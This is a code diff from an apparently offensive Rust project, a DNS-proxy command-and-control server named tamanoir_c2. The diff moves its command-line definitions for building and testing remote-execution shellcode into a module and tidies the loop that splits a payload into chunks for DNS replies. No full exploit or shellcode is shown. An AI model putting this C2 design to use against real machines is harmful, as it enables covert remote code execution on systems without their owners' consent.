@@ -1,84 +1,17 @@
 use std::{collections::HashMap, net::Ipv4Addr, sync::Arc};
 
-use clap::{Parser, Subcommand};
+use clap::Parser;
 use log::{debug, error, info};
 use tamanoir_c2::{
-    builder::build,
-    handlers::{add_info, forward_req, init_keymaps, mangle, max_payload_length},
-    select_payload,
-    tester::test_bin,
-    Engine, Session, TargetArch,
+    cli::{Command, Opt, RceCommand},
+    handlers::{
+        dns_proxy::{add_info, forward_req, init_keymaps, mangle, max_payload_length},
+        rce::{builder::build, tester::test_bin},
+    },
+    select_payload, Session, TargetArch,
 };
 use tamanoir_common::ContinuationByte;
 use tokio::{net::UdpSocket, sync::Mutex};
-
-#[derive(Debug, Parser)]
-struct Opt {
-    #[clap(subcommand)]
-    command: Command,
-}
-#[derive(Debug, Subcommand)]
-enum Command {
-    #[clap(subcommand)]
-    #[command(about = "Build/test Remote Control Execution shell codes")]
-    Rce(RceCommand),
-    #[command(about = "Start the dns proxy / c2 server")]
-    Start {
-        #[clap(short, long, default_value = "53")]
-        port: u16,
-        #[clap(long, default_value = "8.8.8.8")]
-        dns_ip: Ipv4Addr,
-        #[clap(long, default_value = "8")]
-        payload_len: usize,
-        #[clap(long, default_value = "hello")]
-        rce: String,
-        #[clap(long, default_value = "x86_64")]
-        target_arch: TargetArch,
-    },
-}
-
-#[derive(Debug, Subcommand)]
-enum RceCommand {
-    #[command(about = "Build shell code payload for specified architecture")]
-    Build {
-        #[clap(short,long, default_value = "x86_64",help=format!("Target architecture (supported are {:#?} )",TargetArch::ALL.into_iter().map(|t|t.to_string()).collect::<Vec<_>>()))]
-        target_arch: TargetArch,
-        #[clap(
-            short,
-            long,
-            default_value = "docker",
-            help = "cross build engine (docker and podman supported)"
-        )]
-        engine: Engine,
-        #[clap(
-            short,
-            long,
-            default_value = "",
-            help = "key=value, space-separated env vars required for your shellcode, if needed"
-        )]
-        build_vars: String,
-        #[clap(short, long)]
-        crate_path: String,
-        #[clap(short, long)]
-        out_dir: String,
-    },
-    #[command(about = "Build shell code payload for all available aritectures")]
-    BuildAll {
-        #[clap(short, long, default_value = "docker")]
-        engine: Engine,
-        #[clap(short, long, default_value = "")]
-        build_vars: String,
-        #[clap(short, long)]
-        crate_path: String,
-        #[clap(short, long)]
-        out_dir: String,
-    },
-    #[command(about = "Test a shellcode against current architecture")]
-    Test {
-        #[clap(short, long)]
-        bin_path: String,
-    },
-}
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
@@ -155,14 +88,14 @@ async fn main() -> anyhow::Result<()> {
                         data.len(),
                         payload_max_len
                     );
-                    if remaining_payload.len() > 0 {
+                    if !remaining_payload.is_empty() {
                         let payload: Vec<u8> = remaining_payload
                             .drain(0..payload_max_len.min(remaining_payload.len()))
                             .collect();
                         debug!("PAYLOAD SZ={}", payload.len());
                         let cbyte = if payload.len() == selected_payload.len() {
                             ContinuationByte::ResetEnd
-                        } else if remaining_payload.len() == 0 {
+                        } else if remaining_payload.is_empty() {
                             ContinuationByte::End
                         } else if is_start {
                             ContinuationByte::Reset
